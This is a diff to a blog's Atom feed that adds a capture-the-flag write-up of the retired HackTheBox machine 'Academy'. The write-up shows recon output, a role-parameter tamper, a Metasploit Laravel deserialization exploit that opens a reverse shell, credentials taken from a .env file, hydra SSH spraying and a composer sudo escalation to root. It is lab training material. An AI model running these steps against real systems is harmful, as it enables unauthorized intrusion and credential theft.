@@ -1,5 +1,265 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-02-07T18:15:00+01:00</updated><entry><title>HTB: Doctor</title><link href="https://maggick.fr/2021/02/htb-doctor.html" rel="alternate"></link><published>2021-02-07T18:15:00+01:00</published><updated>2021-02-07T18:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-07:/2021/02/htb-doctor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Doctor card" class="align-left" src="/media/2021.02/doctor_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-02-28T10:00:00+01:00</updated><entry><title>HTB: Academy</title><link href="https://maggick.fr/2021/02/htb-academy.html" rel="alternate"></link><published>2021-02-28T10:00:00+01:00</published><updated>2021-02-28T10:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-28:/2021/02/htb-academy.html</id><summary type="html">&lt;p&gt;&lt;img alt="Academy card" class="align-left" src="/media/2021.02/academy_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/297"&gt;Academy&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; and publish on
+November 7, 2020.
+This box is classified as an easy machine. The user part involve a public
+exploit and some enumeration. The root part implies enumeration and a &lt;code&gt;sudo&lt;/code&gt;
+binary.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.02/academy_card.png" alt="Academy card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/297"&gt;Academy&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; and publish on
+November 7, 2020.
+This box is classified as an easy machine. The user part involve a public
+exploit and some enumeration. The root part implies enumeration and a &lt;code&gt;sudo&lt;/code&gt;
+binary.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only ports 22 (SSH), 80 (HTTP) and 33060 (MYSQL) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Wed Nov  11 03:19:47 2020 as: nmap -p- -oN nmap 10.129.39.166&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.129.39.166&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.012s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp    open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;33060/tcp open  mysqlx&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Wed Nov  11 03:19:55 2020 -- 1 IP address (1 host up) scanned in 8.25 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The website is a new HTB feature (as was &lt;a href="/2019/09/htb-swagshop.html"&gt;swagshop&lt;/a&gt;)
+&lt;strong&gt;Academy&lt;/strong&gt;. We can register an account but most of the functionalities are not
+working.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Academy homepage" src="/media/2021.02/academy_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We run a &lt;code&gt;dirb&lt;/code&gt; on the website that allow use to find the &lt;code&gt;admin.php&lt;/code&gt; endpoint.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ dirb http://academy.htb/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
+&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;START_TIME: Wed Nov  11 03:24:21 2020&lt;/span&gt;
+&lt;span class="code-line"&gt;URL_BASE: http://academy.htb/&lt;/span&gt;
+&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Scanning URL: http://academy.htb/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://academy.htb/admin.php (CODE:200|SIZE:2633)&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://academy.htb/images/&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://academy.htb/index.php (CODE:200|SIZE:2117)&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://academy.htb/server-status (CODE:403|SIZE:276)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id="adminphp"&gt;admin.php&lt;/h3&gt;
+&lt;p&gt;When taking a closer look at the registration request, we can see that there is
+a post parameter &lt;code&gt;roleid&lt;/code&gt; set to &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /register.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: academy.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 44&lt;/span&gt;
+&lt;span class="code-line"&gt;Origin: http://academy.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Referer: http://academy.htb/register.php&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=pf1cigmrl6la8c0o7lte5jubum&lt;/span&gt;
+&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=toto&amp;amp;password=toto&amp;amp;confirm=toto&amp;amp;roleid=0&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Using Burp and the proxy module, we change the &lt;code&gt;roleid&lt;/code&gt; parameter to &lt;code&gt;1&lt;/code&gt;. Our
+new account can now log into the admin part. Which is mostly a &lt;em&gt;todo&lt;/em&gt; list,
+disclosing the staging environment virtual host.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Academy Launch Planner" src="/media/2021.02/academy_02.png"&gt;&lt;/p&gt;
+&lt;h3 id="staging"&gt;Staging&lt;/h3&gt;
+&lt;p&gt;We update our &lt;code&gt;/etc/hosts&lt;/code&gt; and browse to the staging environment.&lt;/p&gt;
+&lt;p&gt;http://dev-staging-01.academy.htb/&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Academy staging environment" src="/media/2021.02/academy_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;We see in the disclosed path that the staging environment use
+the &lt;a href="https://laravel.com/"&gt;laravel framework&lt;/a&gt; which as a few public exploit one
+of them allowing for remote command execution.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit laravel&lt;/span&gt;
+&lt;span class="code-line"&gt;-------------------------------------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                                                            |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;-------------------------------------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Laravel - &amp;#39;Hash::make()&amp;#39; Password Truncation Security                     | multiple/remote/39318.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Laravel Log Viewer &amp;lt; 0.13.0 - Local File Download                         | php/webapps/44343.py&lt;/span&gt;
+&lt;span class="code-line"&gt;PHP Laravel Framework 5.5.40 / 5.6.x &amp;lt; 5.6.30 - token Unserialize Remote  | linux/remote/47129.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                 | php/webapps/48166.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload        | php/webapps/46389.py&lt;/span&gt;
+&lt;span class="code-line"&gt;-------------------------------------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Shellcodes: No Results&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The unserialization exploit is a metasploit one. So we fire up &lt;code&gt;msf&lt;/code&gt;, load the
+exploit and configure the options to use the API key (disclosed on the debug
+page) and our virtual host. Then we run the exploit and get a shell as
+&lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; show options&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Module options (exploit/unix/http/laravel_token_unserialize_exec):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Name       Current Setting                               Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;  ----       ---------------                               --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;  APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file&lt;/span&gt;
+&lt;span class="code-line"&gt;  Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
+&lt;span class="code-line"&gt;  RHOSTS     10.129.39.166                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;  RPORT      80                                            yes       The target port (TCP)&lt;/span&gt;
+&lt;span class="code-line"&gt;  SSL        false                                         no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
+&lt;span class="code-line"&gt;  TARGETURI  /                                             yes       Path to target webapp&lt;/span&gt;
+&lt;span class="code-line"&gt;  VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.20:4444&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Command shell session 3 opened (10.10.14.20:4444 -&amp;gt; 10.129.39.166:36996) at 2020-11-11 04:11:10 -0500&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="foothold"&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;We start enumerating and found a few credentials sets for the database. We also
+extract the users list from &lt;code&gt;/etc/passwd&lt;/code&gt; and run the retrieved creds against the
+SSH service using hydra. The password stored in &lt;code&gt;acedemy/.env&lt;/code&gt; allow us to
+connect as &lt;code&gt;cry0l1t3&lt;/code&gt; using SSH and grab the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat ls ../../academy/.env&lt;/span&gt;
+&lt;span class="code-line"&gt;APP_NAME=Laravel&lt;/span&gt;
+&lt;span class="code-line"&gt;APP_ENV=local&lt;/span&gt;
+&lt;span class="code-line"&gt;APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&lt;/span&gt;
+&lt;span class="code-line"&gt;APP_DEBUG=false&lt;/span&gt;
+&lt;span class="code-line"&gt;APP_URL=http://localhost&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;LOG_CHANNEL=stack&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;DB_CONNECTION=mysql&lt;/span&gt;
+&lt;span class="code-line"&gt;DB_HOST=127.0.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;DB_PORT=3306&lt;/span&gt;
+&lt;span class="code-line"&gt;DB_DATABASE=academy&lt;/span&gt;
+&lt;span class="code-line"&gt;DB_USERNAME=dev&lt;/span&gt;
+&lt;span class="code-line"&gt;DB_PASSWORD=mySup3rP4s5w0rd!!&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;BROADCAST_DRIVER=log&lt;/span&gt;
+&lt;span class="code-line"&gt;CACHE_DRIVER=file&lt;/span&gt;
+&lt;span class="code-line"&gt;SESSION_DRIVER=file&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;$ hydra  -L users -p &amp;#39;mySup3rP4s5w0rd!!&amp;#39; ssh://10.129.39.166&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-11 08:34:04&lt;/span&gt;
+&lt;span class="code-line"&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;/span&gt;
+&lt;span class="code-line"&gt;[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task&lt;/span&gt;
+&lt;span class="code-line"&gt;[DATA] attacking ssh://10.129.39.166:22/&lt;/span&gt;
+&lt;span class="code-line"&gt;[22][ssh] host: 10.129.39.166   login: cry0l1t3   password: mySup3rP4s5w0rd!!&lt;/span&gt;
+&lt;span class="code-line"&gt;1 of 1 target successfully completed, 1 valid password found&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-11 08:34:09&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;$ ssh -l cry0l1t3 10.129.39.166&lt;/span&gt;
+&lt;span class="code-line"&gt;cry0l1t3@10.129.39.166&amp;#39;s password:&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;* Documentation:  https://help.ubuntu.com&lt;/span&gt;
+&lt;span class="code-line"&gt;* Management:     https://landscape.canonical.com&lt;/span&gt;
+&lt;span class="code-line"&gt;* Support:        https://ubuntu.com/advantage&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  System information as of Wed 11 Nov 2020 01:53:21 PM UTC&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  System load:             0.0&lt;/span&gt;
+&lt;span class="code-line"&gt;  Usage of /:              44.5% of 15.68GB&lt;/span&gt;
+&lt;span class="code-line"&gt;  Memory usage:            18%&lt;/span&gt;
+&lt;span class="code-line"&gt;  Swap usage:              0%&lt;/span&gt;
+&lt;span class="code-line"&gt;  Processes:               171&lt;/span&gt;
+&lt;span class="code-line"&gt;  Users logged in:         0&lt;/span&gt;
+&lt;span class="code-line"&gt;  IPv4 address for ens160: 10.129.39.166&lt;/span&gt;
+&lt;span class="code-line"&gt;  IPv6 address for ens160: dead:beef::250:56ff:feb9:a424&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;0 updates can be installed immediately.&lt;/span&gt;
+&lt;span class="code-line"&gt;0 of these updates are security updates.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Wed Nov  11 13:35:52 2020 from 10.10.14.20&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;c3a5e57a709f0c1bdc6874b9ad7af1b1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;h2 id="lateral-movement"&gt;lateral movement&lt;/h2&gt;
+&lt;p&gt;Our user is in the &lt;code&gt;adm&lt;/code&gt; group. We can run &lt;code&gt;bash&lt;/code&gt; to have a better shell.&lt;/p&gt;
+&lt;p&gt;$ id
+uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)&lt;/p&gt;
+&lt;p&gt;According to GNU/Linux &lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation"&gt;documentation&lt;/a&gt;
+this group has access to &lt;code&gt;/var/log/&lt;/code&gt; but there is nothing of interest there. We
+also have access to the &lt;code&gt;aureport&lt;/code&gt; command and list the &lt;code&gt;tty&lt;/code&gt; access containing
+&lt;code&gt;mrb3n&lt;/code&gt; password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cry0l1t3@academy:/var/log$ aureport --tty&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;TTY Report&lt;/span&gt;
+&lt;span class="code-line"&gt;===============================================&lt;/span&gt;
+&lt;span class="code-line"&gt;# date time event auid term sess comm data&lt;/span&gt;
+&lt;span class="code-line"&gt;===============================================&lt;/span&gt;
+&lt;span class="code-line"&gt;Error opening config file (Permission denied)&lt;/span&gt;
+&lt;span class="code-line"&gt;NOTE - using built-in logs: /var/log/audit/audit.log&lt;/span&gt;
+&lt;span class="code-line"&gt;1. 08/12/2020 02:28:10 83 0 ? 1 sh &amp;quot;su mrb3n&amp;quot;,&amp;lt;nl&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;2. 08/12/2020 02:28:13 84 0 ? 1 su &amp;quot;mrb3n_Ac@d3my!&amp;quot;,&amp;lt;nl&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;3. 08/12/2020 02:28:24 89 0 ? 1 sh &amp;quot;whoami&amp;quot;,&amp;lt;nl&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="composer"&gt;Composer&lt;/h2&gt;
+&lt;p&gt;We switch user &lt;code&gt;su&lt;/code&gt; to our new &lt;code&gt;mrb3n&lt;/code&gt; user and list our sudo persmission. We
+have sudo access to &lt;code&gt;composer&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cry0l1t3@academy:/var/log$ su mrb3n&lt;/span&gt;
+&lt;span class="code-line"&gt;Password:&lt;/span&gt;
+&lt;span class="code-line"&gt;$ bash&lt;/span&gt;
+&lt;span class="code-line"&gt;mrb3n@academy:/home$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)&lt;/span&gt;
+&lt;span class="code-line"&gt;mrb3n@academy:/home$ sudo -l&lt;/span&gt;
+&lt;span class="code-line"&gt;[sudo] password for mrb3n:&lt;/span&gt;
+&lt;span class="code-line"&gt;Matching Defaults entries for mrb3n on academy:&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User mrb3n may run the following commands on academy:&lt;/span&gt;
+&lt;span class="code-line"&gt;    (ALL) /usr/bin/composer&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Using &lt;a href="https://gtfobins.github.io/gtfobins/composer/"&gt;gtfobins&lt;/a&gt; we quickly
+obtain a root shell and the root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mrb3n@academy:/home$ TF=$(mktemp -d)&lt;/span&gt;
+&lt;span class="code-line"&gt;mrb3n@academy:/home$ echo &amp;#39;{&amp;quot;scripts&amp;quot;:{&amp;quot;x&amp;quot;:&amp;quot;/bin/sh -i 0&amp;lt;&amp;amp;3 1&amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;}}&amp;#39; &amp;gt;$TF/composer.json&lt;/span&gt;
+&lt;span class="code-line"&gt;mrb3n@academy:/home$ sudo composer --working-dir=$TF run-script x&lt;/span&gt;
+&lt;span class="code-line"&gt;PHP Warning:  PHP Startup: Unable to load dynamic library &amp;#39;mysqli.so&amp;#39; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0&lt;/span&gt;
+&lt;span class="code-line"&gt;PHP Warning:  PHP Startup: Unable to load dynamic library &amp;#39;pdo_mysql.so&amp;#39; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0&lt;/span&gt;
+&lt;span class="code-line"&gt;Do not run Composer as root/super user! See https://getcomposer.org/root for details&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt; /bin/sh -i 0&amp;lt;&amp;amp;3 1&amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&lt;/span&gt;
+&lt;span class="code-line"&gt;# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;c54ee4bf2a048550483176f6cb528d95&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;An easy machine mostly based on public exploit and enumeration. I will recommand
+it to begginers.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="laravel"></category><category term="composer"></category></entry><entry><title>HTB: Doctor</title><link href="https://maggick.fr/2021/02/htb-doctor.html" rel="alternate"></link><published>2021-02-07T18:15:00+01:00</published><updated>2021-02-07T18:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-07:/2021/02/htb-doctor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Doctor card" class="align-left" src="/media/2021.02/doctor_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/278"&gt;Doctor&lt;/a&gt; created by
 &lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
